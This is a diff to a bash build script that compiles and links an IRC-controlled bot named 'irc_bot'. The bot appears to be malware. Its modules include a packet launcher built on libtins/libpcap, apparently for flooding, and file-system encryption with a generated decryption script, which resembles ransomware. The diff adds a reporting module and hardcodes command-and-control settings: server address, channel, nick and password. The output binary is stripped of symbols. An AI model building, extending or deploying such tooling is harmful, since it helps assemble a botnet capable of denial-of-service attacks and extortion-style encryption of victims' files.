@@ -1,36 +1,38 @@
 #!/bin/bash
 
-# Enable or disable features
 ENABLE_PING_ACTION=1
 ENABLE_ENCRYPT_ACTION=1
+ENABLE_REPORT_ACTION=1
 
-# Initialize object file variables
+ENABLE_PING_FLAG=""
+ENABLE_ENCRYPT_FLAG=""
+ENABLE_REPORT_FLAG=""
+
 PING_ACTION_OBJ=""
 PACKET_LAUNCHER_OBJ=""
 ENCRYPT_ACTION_OBJ=""
 CRYPTO_MANAGER_OBJ=""
-ENABLE_PING_FLAG=""
-ENABLE_ENCRYPT_FLAG=""
 FS_DECRYPTOR_OBJ=""
 GEN_SCRIPT_OBJ=""
+REPORT_ACTION_OBJ=""
 
-# Compile PingAction if enabled
-if [ "$ENABLE_PING_ACTION" -eq 1 ]; then
-    echo "Compiling PingAction.cpp"
+BOT_NICK="bot_NICK"
+BOT_USER="bot_USER"
+SERVER_ADDRESS="192.168.1.127"
+ASSIGNED_CHANNEL="#testChannel"
+BOT_PASS="test123"
+
+if [[ "$ENABLE_PING_ACTION" -eq 1 ]]; then
     g++ -std=c++17 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -c PingAction.cpp -o PingAction.o
     PING_ACTION_OBJ="PingAction.o"
-    echo "Compiling PacketLauncher.cpp"
     g++ -std=c++17 -Wall -Wextra -Iinclude -c PacketLauncher.cpp -o PacketLauncher.o
     PACKET_LAUNCHER_OBJ="PacketLauncher.o"
     ENABLE_PING_FLAG="-DENABLE_PING_ACTION"
 fi
 
-# Compile EncryptAction if enabled
-if [ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]; then
-    echo "Compiling EncryptAction.cpp"
+if [[ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]]; then
     g++ -std=c++17 -Wall -Wextra -Iinclude -c EncryptAction.cpp -o EncryptAction.o
     ENCRYPT_ACTION_OBJ="EncryptAction.o"
-    echo "Compiling CryptoManager.cpp"
     g++ -std=c++17 -Wall -Wextra -Iinclude -c CryptoManager.cpp -o CryptoManager.o
     g++ -std=c++17 -Wall -Wextra -Iinclude -c FileSystemDecryptor.cpp -o FileSystemDecryptor.o
     g++ -std=c++17 -Wall -Wextra -Iinclude -c GenDecryptionScript.cpp -o GenDecryptionScript.o
@@ -40,15 +42,17 @@ if [ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]; then
     GEN_SCRIPT_OBJ="GenDecryptionScript.o"
 fi
 
-# Compile main source files with the same definitions
-echo "Compiling main source files"
-g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -c BotMain.cpp -o BotMain.o
-g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG -c IrcClient.cpp -o IrcClient.o
+if [[ "$ENABLE_REPORT_ACTION" -eq 1 ]]; then
+    g++ -std=c++17 -Wall -Wextra -Iinclude -c ReportAction.cpp -o ReportAction.o
+    REPORT_ACTION_OBJ="ReportAction.o"
+    ENABLE_REPORT_FLAG="-DENABLE_REPORT_ACTION"
+fi
+
+g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -DBOT_NICK=\"$BOT_NICK\" -DBOT_USER=\"$BOT_USER\" -DSERVER_ADDRESS=\"$SERVER_ADDRESS\" -DASSIGNED_CHANNEL=\"$ASSIGNED_CHANNEL\" -DBOT_PASS=\"$BOT_PASS\" -c BotMain.cpp -o BotMain.o
+g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG $ENABLE_REPORT_FLAG -c IrcClient.cpp -o IrcClient.o
 g++ -std=c++17 -Wall -Wextra -Iinclude -c MessageParser.cpp -o MessageParser.o
 g++ -std=c++17 -Wall -Wextra -Iinclude -c GeneralUtils.cpp -o GeneralUtils.o
 
-# Link object files
-echo "Linking object files"
-g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s
+g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ $REPORT_ACTION_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s
 
-echo "Build finished"
+printf "Build complete!\n"
